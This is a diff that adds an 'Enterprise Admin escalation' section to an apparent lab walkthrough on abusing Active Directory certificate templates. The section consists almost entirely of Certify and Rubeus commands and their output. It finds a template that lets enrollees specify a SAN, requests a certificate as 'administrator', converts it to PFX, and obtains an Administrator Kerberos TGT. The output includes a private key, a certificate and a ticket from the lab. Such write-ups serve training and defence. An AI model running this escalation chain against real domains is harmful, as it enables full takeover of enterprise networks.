@@ -8,6 +8,7 @@
 Index:
   1. [Evaluate Certificate templates](#evaluate-certificate-templates)
   2. [Abuse Certificate templates](#abuse-certificate-templates)
+  3. [Enterprise Admin escalation](#enterprise-admin-escalation)
 
 
 ## Evaluate Certificate templates
@@ -784,4 +785,269 @@ C:\Users\Administrator>hostname
 hostname
 dcorp-dc
 
+```
+
+## Enterprise Admin escalation
+
+Looking for vulnerable template:
+
+```
+C:\AD\Tools>C:\AD\Tools\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Agent
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Certificate Request Agent
+    mspki-certificate-application-policy  : Certificate Request Agent
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+
+
+Certify completed in 00:00:14.6569470
+```
+
+Request vulnerable template with student162 user, because the user belong to the following group [dcorp\Domain Users]
+
+```
+C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent /altname:administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : dcorp\student162
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : SmartCardEnrollment-Agent
+[*] Subject                 : CN=student162, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+[*] AltName                 : administrator
+
+[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 24
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAxLmIaT1GhbtiBZr8AqI/WrsWWIdNt+mMfDfAl4SBIya0nETG
+eDHJ/OuIWql5sO7KzTi05UrClhAh5AOC0pyUqVR6Aanrr6r9sbR8ZDCiN9knGTnS
+pqgckdOKk2SzzAI9BCVyk6xRlueujQd9rSi0p88UXnoApliDGh9IQZBaQbVPxIQn
+Gup969+FDsr6ilDijMXIB0GR7Yy3GZdVTBe8qiOROUUN2qxY7jjwm+flIntRYrIV
+jlcKEwQOyYsQ8HLZ3tynbtkGDS7Q3qWD0MFAQZNxVzvuuHiudtyhBwFhFCHUVgkP
+jDlW5fXf4mDwo4tnkNNchjV0uMyqrFU5uoExCQIDAQABAoIBAElQe6380BN2ygkc
+wV6Z6NJ/dsx3YFdyCpEglf3hu97FxfmXCAAzTfucK6zeDCQMWjgxMflh6zLRwE+h
+n1euUxjoCrAkC1nkd7eKc/FCzrHRk+iqy/6gGEWgeLyFgxw8mVC6RAEU7zM2FK8q
+Y4Ps76a6XfT3stZLllBd6CfHDFv/9rKxL96noGfKj8XXGJborCrW5U/gGIDxIxM2
+S0LhVrQho62E3p6V0IF8pAL3P6C4P5I7olptQc9Ldoi7M+E/yAWFkOyrWYFWbemg
+JypEj4lbMeME7yV52RDX3snpCEBhKtY8T9RNUJhX6BK6AydGCg151Adb01QjEIHq
+tWyc+CECgYEA7hGq1a3d0FA6iPf3Dd5yqanLwm4ZXth9q+glibnNbtSMPEjiwcv+
+BkCjDgLSSiXxTwrgmkwNtp91XNu+HnoXtw4+MgLVJOaRkN2iqSLRsJ3GOqhGQxsC
+PRB8lufNtgg/6oXtmDNDM1cC3CulZuyXofoV88PqiBlCyra2/o0Rm4cCgYEA04qv
+XYCXoXSfSZBszZVMdI1qYcOyd6mLGj2sLBKejwOJ1Wi0riC/GlY93egJ7D1GK30D
+1BQWjRgFCGuPb3BdOA7HT5TOZq2IYPUKZIG07f7AmhEUK3bL50R9OU/WfGjxeeB3
+o8hYyARAvat5fB3+aDmKKO9oE51gEWFAEoQyku8CgYEAqI5Htyx3zSLQnuN5vw8N
+fgSjKJENU3LSX6Fo2n977Ql+FLzCF9ZXj5O6HpRu0WLV3FHmPji0yOVTkiBfFnL5
+UXk7HeuVf5/j1n6lyTzG3FaI4ET+IksAJb4DiFCs/EIRBvo2A7nfzXzAoKQiYqIG
+pf9MBaBj8GJ6QM5m+AlnOwcCgYBzl22Z1yGD/PjpNrztXW6IpZmC0G+dyYwUC60f
+7BCuLw3LCkrod0ZVetiVgCyj5RuJuec0pMFp2b0uS6/2Ad0+O30XdEWQf7Rs3pkO
+MH4QKktOJJTz5xcmSRtwDLs0AhgpM8nMOjahHQnPWnqooq8YfpCLK76gMTeEZ7Ke
+K5SDCwKBgBdOYzQXBuQDE1Amwef9sONVbXL4EZBBAdrwObH8Cwb7xtE/0dGrSO5w
+sUMCtUcoomTJidpU+Ic/GZurwBsB8pnTCMbW6951kexDMGQNg6a9a71cY2YYtilC
+iNqsWHCczC9h5joM96CSAMJ7wGOdpVEUnBEzSY1POAvBLt2Rp/MJ
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGQTCCBSmgAwIBAgITFQAAABgasp1Cewk+1AAAAAAAGDANBgkqhkiG9w0BAQsF
+ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
+eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA1MDMw
+NzI4MzBaFw0yNTA1MDMwNzM4MzBaMHYxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
+MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
+cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMIIB
+IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxLmIaT1GhbtiBZr8AqI/WrsW
+WIdNt+mMfDfAl4SBIya0nETGeDHJ/OuIWql5sO7KzTi05UrClhAh5AOC0pyUqVR6
+Aanrr6r9sbR8ZDCiN9knGTnSpqgckdOKk2SzzAI9BCVyk6xRlueujQd9rSi0p88U
+XnoApliDGh9IQZBaQbVPxIQnGup969+FDsr6ilDijMXIB0GR7Yy3GZdVTBe8qiOR
+OUUN2qxY7jjwm+flIntRYrIVjlcKEwQOyYsQ8HLZ3tynbtkGDS7Q3qWD0MFAQZNx
+VzvuuHiudtyhBwFhFCHUVgkPjDlW5fXf4mDwo4tnkNNchjV0uMyqrFU5uoExCQID
+AQABo4IC6jCCAuYwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jh
+hyaCn65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIB
+MA4GA1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEw
+HQYDVR0OBBYEFE91A/mj/0DjpUk2X9aspPOGalDzMCgGA1UdEQQhMB+gHQYKKwYB
+BAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFNH+jQqn+rQynzb8
+ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NOPW1v
+bmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVibGlj
+JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
+Qz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
+YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEFBQcB
+AQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1NQ09S
+UC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
+dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/Y0FD
+ZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3Jp
+dHkwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEEAYI3GQIBoC4ELFMtMS01LTIxLTcx
+OTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2NDgtNTAwMA0GCSqGSIb3DQEBCwUA
+A4IBAQC/0oCdwYRwBpV0TSgcHJODVbhgEEPyuonZVKx0ghZxhyXdKBESuvL/VrlD
+om6RdC+3jijhOfoJT5NGh+KFEDUSmKG8RhKGucOc1SdvYLD7/Jasu+HpkSAVD4+s
+iXomna2TY7oCIR8DlftUoMhOafB9RXK6usTxoShS1+A7esMxMKtriL9c+0etP4x+
+tsXFAI/BSxFrFYanPUV2zqgqBVNkVP5VRuUx9j2sfGpOWqkRsbbpWYhx/J4+81L3
+LCyARK0hWiYSYDVpyzHWotfwSbxT1fTpH0a0/QQSrABCQePPpJk7MWw23j3rC7rE
+UZUOTars4f2Intlp/+UQMEVqYPmT
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:24.2846793
+
+```
+
+Transform pem file to pkcs12:
+
+```
+C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+Enter Export Password:
+Verifying - Enter Export Password:
+
+C:\AD\Tools>dir C:\AD\Tools\EA.pfx
+ Volume in drive C has no label.
+ Volume Serial Number is 1A5A-FDE2
+
+ Directory of C:\AD\Tools
+
+05/03/2023  12:41 AM             3,331 EA.pfx
+               1 File(s)          3,331 bytes
+               0 Dir(s)   9,592,348,672 bytes free
+```
+
+Abuse of certificate:
+
+```
+:\AD\Tools>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /certificate:C:\AD\Tools\certificate_EA.pfx /password:SecretPass@123 /dc:mcorp-dc.moneycorp.local
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
+[*] Using domain controller: 172.16.1.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/moneycorp.local
+  ServiceRealm             :  MONEYCORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  MONEYCORP.LOCAL
+  StartTime                :  5/3/2023 1:01:21 AM
+  EndTime                  :  5/3/2023 11:01:21 AM
+  RenewTill                :  5/10/2023 1:01:21 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  RE1NntnsgtEQGFLzNAvZDw==
+  ASREP (key)              :  2FB68A2A9ECDE026015BFD2BA01AD5EC
 ```
